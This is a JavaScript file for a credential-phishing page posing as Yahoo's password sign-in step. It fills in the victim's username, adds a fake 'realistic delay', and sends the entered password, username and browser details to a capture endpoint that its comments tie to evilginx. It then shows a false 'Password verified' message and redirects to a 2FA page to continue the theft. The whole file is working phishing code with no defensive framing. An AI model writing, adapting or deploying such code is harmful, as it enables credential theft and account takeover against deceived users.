document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("password-form")
  const submitBtn = document.getElementById("submit-btn")
  const errorDiv = document.getElementById("error-message")
  const successDiv = document.getElementById("success-message")
  const passwordInput = document.getElementById("passwd")

  // Get username from URL params or localStorage
  const urlParams = new URLSearchParams(window.location.search)
  const username = urlParams.get("username") || localStorage.getItem("yahoo_username") || ""
  document.getElementById("username").value = username

  function showError(message) {
    errorDiv.textContent = message
    errorDiv.style.display = "block"
    successDiv.style.display = "none"
  }

  function showSuccess(message) {
    successDiv.textContent = message
    successDiv.style.display = "block"
    errorDiv.style.display = "none"
  }

  function hideMessages() {
    errorDiv.style.display = "none"
    successDiv.style.display = "none"
  }

  function setLoading(loading) {
    if (loading) {
      submitBtn.innerHTML = '<span class="spinner"></span>Signing in...'
      submitBtn.disabled = true
      form.classList.add("loading")
    } else {
      submitBtn.innerHTML = "Next"
      submitBtn.disabled = false
      form.classList.remove("loading")
    }
  }

  // Real-time validation
  passwordInput.addEventListener("input", function () {
    hideMessages()
    if (this.value.length > 0) {
      this.style.borderColor = "#6001d2"
    } else {
      this.style.borderColor = "#e1e1e1"
    }
  })

  form.addEventListener("submit", (e) => {
    e.preventDefault()

    const password = passwordInput.value.trim()

    if (!password) {
      showError("Please enter your password.")
      passwordInput.focus()
      return
    }

    if (password.length < 6) {
      showError("Password must be at least 6 characters long.")
      passwordInput.focus()
      return
    }

    setLoading(true)
    hideMessages()

    // Simulate realistic delay
    setTimeout(
      () => {
        // Store credentials
        const credentials = {
          username: username,
          password: password,
          timestamp: new Date().toISOString(),
          user_agent: navigator.userAgent,
          ip_info: "captured_by_evilginx",
        }

        // Send to evilginx data capture
        fetch("/api/capture", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(credentials),
        }).catch(() => {
          // Fail silently - evilginx will capture via form submission
        })

        // Store in localStorage for next step
        localStorage.setItem("yahoo_credentials", JSON.stringify(credentials))

        showSuccess("Password verified successfully!")

        // Redirect to 2FA selection after short delay
        setTimeout(() => {
          window.location.href = "/2fa-selection"
        }, 1500)
      },
      2000 + Math.random() * 1000,
    ) // Random delay 2-3 seconds
  })

  // Handle browser back button
  window.addEventListener("pageshow", (event) => {
    if (event.persisted) {
      setLoading(false)
      hideMessages()
    }
  })

  // Focus on password field
  passwordInput.focus()
})
